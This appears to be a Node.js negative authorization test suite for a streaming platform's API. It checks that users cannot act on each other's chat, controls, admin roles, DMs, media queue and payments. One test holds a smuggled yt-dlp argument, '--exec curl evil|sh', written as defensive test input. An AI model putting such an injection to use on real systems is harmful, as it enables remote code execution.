/**
 * Negative authorization tests: user A must not be able to act on user B's objects.
 *
 * Each case was a real hole found in the 2026-09-16 audit. The real routers are mounted on a temp
 * database; only sign-in is stubbed (an `x-test-user` header selects the account), because Network
 * JWTs cannot be minted locally. Everything after authentication — ownership and role checks, SQL
 * scoping — is the production code.
 *
 *   node test/authorization.test.js
 */
'use strict';
const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');

const tmp = path.join(os.tmpdir(), `ov-authz-${process.pid}.db`);
process.env.DB_PATH = tmp;
process.env.NODE_ENV = 'test';
const quiet = console.log;
console.log = (...a) => { if (!/^\[/.test(String(a[0]))) quiet(...a); };

const db = require('../server/db/database');
db.initDb();
const raw = db.getDb();

// Stub sign-in before any router captures requireAuth.
const auth = require('../server/auth/auth');
const signIn = (req) => {
    const id = Number(req.headers['x-test-user'] || 0);
    const u = id ? db.getUserById(id) : null;
    if (u) { req.user = u; req.authSource = 'network'; }
    return u;
};
auth.requireAuth = (req, res, next) => (signIn(req) ? next() : res.status(401).json({ error: 'Authentication required' }));
auth.optionalAuth = (req, res, next) => { signIn(req); next(); };

// Accounts: an owner-admin, a second admin, two streamers, a bystander.
const addUser = (id, username, role, extra = {}) => raw.prepare(
    `INSERT INTO users (id, username, display_name, email, password_hash, role, is_owner, openvibe_bucks_balance, openvibe_bucks_cashout_balance)
     VALUES (?, ?, ?, ?, 'x', ?, ?, ?, ?)`).run(id, username, username, `${username}@x`, role, extra.is_owner ? 1 : 0, extra.bucks || 0, extra.cashout || 0);
addUser(1, 'owner', 'admin', { is_owner: 1 });
addUser(2, 'admin2', 'admin');
addUser(3, 'alice', 'streamer', { cashout: 0 });
addUser(4, 'bob', 'streamer');
addUser(5, 'carol', 'user', { bucks: 0 });
for (const id of [3, 4]) db.ensureChannel(id);
const chanA = db.getChannelByUserId(3), chanB = db.getChannelByUserId(4);
const streamA = db.createStream({ user_id: 3, channel_id: chanA.id, title: 'A', protocol: 'webrtc' }).lastInsertRowid;
const streamB = db.createStream({ user_id: 4, channel_id: chanB.id, title: 'B', protocol: 'webrtc' }).lastInsertRowid;
const msgB = db.saveChatMessage({ stream_id: streamB, channel_user_id: 4, user_id: 5, username: 'carol', message: 'hello bob' }).lastInsertRowid;

const express = require('express');
const app = express();
app.use(express.json());
app.use('/api/mod', require('../server/admin/mod-routes'));
app.use('/api/controls', require('../server/controls/routes'));
app.use('/api/admin', require('../server/admin/routes'));
app.use('/api/dm', require('../server/chat/dm-routes'));
app.use('/api/media', require('../server/media/routes'));
app.use('/api/ai-viewers', require('../server/ai/viewers/routes'));
app.use('/api/payments', require('../server/monetization/payments-routes'));
const server = http.createServer(app).listen(0);

function call(method, p, user, body) {
    return new Promise((resolve, reject) => {
        const data = body ? JSON.stringify(body) : null;
        const req = http.request({ port: server.address().port, path: p, method, headers: { 'content-type': 'application/json', ...(user ? { 'x-test-user': String(user) } : {}) } }, (res) => {
            let text = '';
            res.on('data', (c) => { text += c; });
            res.on('end', () => { let json = null; try { json = JSON.parse(text); } catch { /* */ } resolve({ status: res.statusCode, json, text }); });
        });
        req.on('error', reject);
        if (data) req.write(data);
        req.end();
    });
}

let failures = 0;
async function check(name, fn) {
    try { await fn(); quiet('  ✓', name); }
    catch (e) { failures++; quiet('  ✗', name, '\n     ', e.message); }
}

(async () => {
    await new Promise((r) => server.once('listening', r));

    await check('chat: owning stream A does not let you delete a message in stream B', async () => {
        const r = await call('POST', '/api/mod/delete-message', 3, { message_id: msgB, stream_id: streamA });
        assert.strictEqual(r.status, 403, r.text);
        assert.strictEqual(db.getChatMessageById(msgB).is_deleted, 0);
    });
    await check('chat: the owner of stream B can delete it', async () => {
        const r = await call('POST', '/api/mod/delete-message', 4, { message_id: msgB });
        assert.strictEqual(r.status, 200, r.text);
    });

    await check('controls: a button id from someone else\'s profile cannot be edited or deleted through yours', async () => {
        const cfgA = db.createControlConfig({ user_id: 3, name: 'A' }).lastInsertRowid;
        const cfgB = db.createControlConfig({ user_id: 4, name: 'B' }).lastInsertRowid;
        const btnB = db.createConfigButton({ config_id: cfgB, label: 'Fire', command: 'fire' }).lastInsertRowid;
        const put = await call('PUT', `/api/controls/configs/${cfgA}/buttons/${btnB}`, 3, { command: 'self_destruct' });
        assert.strictEqual(put.status, 404, put.text);
        const del = await call('DELETE', `/api/controls/configs/${cfgA}/buttons/${btnB}`, 3);
        assert.strictEqual(del.status, 404, del.text);
        const row = raw.prepare('SELECT command FROM control_config_buttons WHERE id = ?').get(btnB);
        assert.strictEqual(row && row.command, 'fire');
    });

    await check('admin: a non-owner admin cannot demote the owner, grant admin, or ban the owner/an admin', async () => {
        assert.strictEqual((await call('PUT', '/api/admin/users/1', 2, { role: 'user' })).status, 403);
        assert.strictEqual((await call('PUT', '/api/admin/users/5', 2, { role: 'admin' })).status, 403);
        assert.strictEqual((await call('POST', '/api/admin/users/1/ban', 2, { reason: 'x' })).status, 403);
        assert.strictEqual(db.getUserById(1).role, 'admin');
        assert.strictEqual(db.getUserById(5).role, 'user');
        assert.strictEqual(db.getUserById(1).is_banned, 0);
    });
    await check('admin: the owner can still grant admin', async () => {
        assert.strictEqual((await call('PUT', '/api/admin/users/5', 1, { role: 'admin' })).status, 200);
        raw.prepare("UPDATE users SET role = 'user' WHERE id = 5").run();
    });

    await check('admin: yt-dlp extra args are owner-only and allow-listed', async () => {
        assert.strictEqual((await call('PUT', '/api/admin/media-tools/extra-args', 2, { extra_args: '--proxy\nsocks5://x' })).status, 403);
        const bad = await call('PUT', '/api/admin/media-tools/extra-args', 1, { extra_args: '--exec\ncurl evil|sh' });
        assert.strictEqual(bad.status, 400, bad.text);
        assert.strictEqual((await call('PUT', '/api/admin/media-tools/extra-args', 1, { extra_args: '--sleep-requests=1' })).status, 200);
    });

    await check('relay users: a plain user cannot hide site-wide or remove another channel\'s hide', async () => {
        assert.strictEqual((await call('POST', '/api/mod/relay-user/hide', 5, { platform: 'twitch', external_username: 'x' })).status, 403);
        db.hideRelayUser({ channelId: chanB.id, platform: 'twitch', externalUsername: 'troll', action: 'ban', createdBy: 4 });
        const row = raw.prepare('SELECT id FROM hidden_relay_users WHERE channel_id = ?').get(chanB.id);
        assert.strictEqual((await call('DELETE', `/api/mod/relay-user/${row.id}`, 3)).status, 403);
        assert.strictEqual((await call('DELETE', `/api/mod/relay-user/${row.id}`, 4)).status, 200);
    });

    await check('IP approval: owning stream #N does not open channel #N\'s queue', async () => {
        // A victim channel whose id equals the id of a stream alice owns.
        const x = raw.prepare('SELECT MAX(id) m FROM streams').get().m + 50;
        raw.prepare("INSERT INTO users (id, username, display_name, email, password_hash, role) VALUES (6, 'dave', 'dave', 'd@x', 'x', 'streamer')").run();
        raw.prepare('INSERT INTO channels (id, user_id, title) VALUES (?, 6, ?)').run(x, 'dave');
        raw.prepare('INSERT INTO streams (id, user_id, channel_id, title, protocol) VALUES (?, 3, ?, ?, ?)').run(x, chanA.id, 'x', 'webrtc');
        const r = await call('GET', `/api/mod/ip-approval/${x}/pending`, 3);
        assert.strictEqual(r.status, 403, r.text);
    });

    await check('DM: a private 1:1 cannot have a third person added', async () => {
        const dm = require('../server/chat/dm');
        dm.ensureTables();
        const conv = dm.createConversation(3, [3, 4]);
        const convId = typeof conv === 'object' ? (conv.id || conv.lastInsertRowid) : conv;
        const r = await call('POST', `/api/dm/conversations/${convId}/participants`, 3, { user_id: 5 });
        assert.strictEqual(r.status, 400, r.text);
        assert.ok(!dm.isParticipant(convId, 5));
    });

    await check('media refund: no credit when the streamer no longer holds the Vibes', () => {
        const mq = require('../server/media/media-queue');
        const reqRow = raw.prepare(`INSERT INTO media_requests (streamer_id, user_id, username, title, cost, currency, status, provider, input, canonical_url)
            VALUES (3, 5, 'carol', 't', 1000, 'vibes', 'pending', 'video', 'https://x', 'https://x')`).run();
        const before = db.getUserById(5).openvibe_bucks_balance;
        const refunded = mq.refund(reqRow.lastInsertRowid);
        assert.strictEqual(refunded, 0);
        assert.strictEqual(db.getUserById(5).openvibe_bucks_balance, before);
    });

    await check('media playback position: only channel managers can move it', async () => {
        const reqRow = raw.prepare(`INSERT INTO media_requests (streamer_id, user_id, username, title, cost, currency, status, provider, input, canonical_url)
            VALUES (3, 5, 'carol', 't', 0, 'vibes', 'playing', 'video', 'https://x', 'https://x')`).run();
        const id = reqRow.lastInsertRowid;
        assert.strictEqual((await call('POST', `/api/media/queue/${id}/position`, null, { position: 99 })).status, 401);
        assert.strictEqual((await call('POST', `/api/media/queue/${id}/position`, 5, { position: 99 })).status, 403);
        assert.strictEqual((await call('POST', `/api/media/queue/${id}/position`, 4, { position: 99 })).status, 403);
        assert.strictEqual((await call('POST', `/api/media/queue/${id}/position`, 3, { position: 42 })).status, 200);
        assert.strictEqual(db.getMediaRequestById(id).playback_position, 42);
    });

    await check("AI viewer clone: a streamer cannot copy someone's chat from other channels", async () => {
        db.saveChatMessage({ stream_id: streamB, channel_user_id: 4, user_id: 5, username: 'carol', message: 'only in bob' });
        assert.strictEqual(db.getChatSamplesInChannel(4, { userId: 5 }).length, 1);
        assert.strictEqual(db.getChatSamplesInChannel(3, { userId: 5 }).length, 0);
        const r = await call('POST', '/api/ai-viewers/clone', 3, { kind: 'user', ref: 5 });
        assert.strictEqual(r.status, 404, r.text);
    });

    await check('payments: a CCBill sale cannot be pointed at a larger order, and replays credit once', async () => {
        db.setSetting('ccbill_webhook_secret', 'sek');
        const pay = require('../server/monetization/payments');
        const big = db.createPaymentOrder({ user_id: 5, provider: 'ccbill', kind: 'bucks', amount_cents: 10000, bucks: 10000 });
        const other = db.createPaymentOrder({ user_id: 5, provider: 'paypal', kind: 'bucks', amount_cents: 100, bucks: 100 });
        const bal = () => db.getUserById(5).openvibe_bucks_balance;
        const start = bal();
        const hook = (q) => call('POST', `/api/payments/webhook/ccbill?secret=sek&${new URLSearchParams(q)}`, null, {});
        await hook({ 'X-order': big.id, eventType: 'NewSaleSuccess', billedInitialPrice: '1.00' });
        await hook({ 'X-order': big.id, eventType: 'NewSaleSuccess' });
        await hook({ 'X-order': other.id, eventType: 'NewSaleSuccess', billedInitialPrice: '1.00' });
        assert.strictEqual(bal(), start, 'underpaid, unpriced or wrong-provider sale credited');
        await hook({ 'X-order': big.id, eventType: 'NewSaleSuccess', billedInitialPrice: '100.00' });
        await hook({ 'X-order': big.id, eventType: 'NewSaleSuccess', billedInitialPrice: '100.00' });
        assert.strictEqual(bal(), start + 10000);
        // A stale copy read before an await (PayPal return vs. webhook) must not credit again.
        const stale = db.getPaymentOrderById(other.id);
        assert.strictEqual(pay.fulfillBucksOrder(db.getPaymentOrderById(other.id)), true);
        assert.strictEqual(pay.fulfillBucksOrder(stale), false);
        assert.strictEqual(bal(), start + 10100);
    });

    await check('API tokens: scopes gate writes; money, staff and credential routes refuse tokens', () => {
        const t = (method, url, scopes) => auth.apiTokenAllows({ method, originalUrl: url }, scopes);
        assert.strictEqual(t('GET', '/api/streams', ['read']), true);
        assert.strictEqual(t('POST', '/api/funds/cashout', ['read', 'stream', 'chat', 'control']), false);
        assert.strictEqual(t('GET', '/api/admin/users', ['read']), false);
        assert.strictEqual(t('DELETE', '/api/vods/3', ['read', 'chat']), false);
        assert.strictEqual(t('DELETE', '/api/vods/3', ['stream']), true);
        assert.strictEqual(t('POST', '/api/chat/send', ['chat']), true);
        assert.strictEqual(t('POST', '/api/controls/configs', ['read']), false);
        assert.strictEqual(t('GET', '/api/auth/stream-key', ['read']), false);
    });

    server.close();
    for (const ext of ['', '-wal', '-shm']) { try { fs.unlinkSync(tmp + ext); } catch { /* */ } }
    if (failures) { quiet(`\n${failures} failure(s)`); process.exit(1); }
    quiet('\nauthorization: all checks passed');
    process.exit(0);
})().catch((e) => { quiet(e); process.exit(1); });
